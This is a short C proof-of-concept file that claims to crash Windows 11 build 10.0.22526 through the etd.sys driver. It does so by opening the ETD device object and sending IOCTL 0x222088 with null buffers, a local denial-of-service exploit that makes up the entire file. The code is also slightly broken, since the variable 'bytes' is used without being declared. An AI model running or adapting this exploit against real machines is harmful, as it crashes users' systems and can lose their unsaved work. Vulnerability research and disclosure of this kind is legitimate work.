//This is POC to crash windows 11 10.0.22526 which have etd.sys 

#include <Windows.h>
#include <stdio.h>

int main()
{
    HANDLE deviceHandle = CreateFile(L"\\\\.\\GLOBALROOT\\DEVICE\\ETD", GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
    DeviceIoControl(deviceHandle, 0x222088, NULL,0, NULL, 0, &bytes, NULL);
    return 0;
}
